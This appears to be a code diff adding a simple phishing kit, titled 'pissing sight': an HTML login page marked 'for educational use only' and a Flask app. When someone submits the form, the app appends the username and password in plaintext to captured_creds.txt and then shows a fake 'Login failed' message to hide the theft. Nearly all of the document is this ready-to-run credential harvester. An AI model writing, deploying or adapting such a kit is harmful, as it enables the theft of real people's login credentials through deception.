@@ -187,4 +187,118 @@ DELETE
 
 
 
+pissing sight
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        * {box-sizing: border-box;}
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f6f8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h1 { margin-bottom: 24px; color: #333; }
+        label {
+            display: block;
+            text-align: left;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #555;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            transition: border 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+        input[type="submit"] {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+        input[type="submit"]:hover { background-color: #0056b3;}
+        .note {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Login</h1>
+        <form method="POST">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter your username" required>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <input type="submit" value="Login">
+        </form>
+        <p class="note">This is a demo login page for educational use only.</p>
+    </div>
+</body>
+</html>
 
+
+from flask import Flask, render_template, request, redirect
+import os
+
+app = Flask(__name__)
+
+# Create captured_creds.txt if it doesn't exist
+if not os.path.exists('captured_creds.txt'):
+    open('captured_creds.txt', 'w').close()
+
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        
+        # Save credentials to file
+        with open('captured_creds.txt', 'a') as f:
+            f.write(f"Username: {username}, Password: {password}\n")
+        
+        # Redirect to fake error page
+        return redirect('/error')
+    
+    return render_template('login.html')
+
+@app.route('/error')
+def error():
+    return "<h2>Login failed. Please try again later.</h2>"
+
+if __name__ == '__main__':
+    print("Template folder:", app.template_folder)
+    print("Templates available:", os.listdir(app.template_folder))
+    app.run(debug=True)
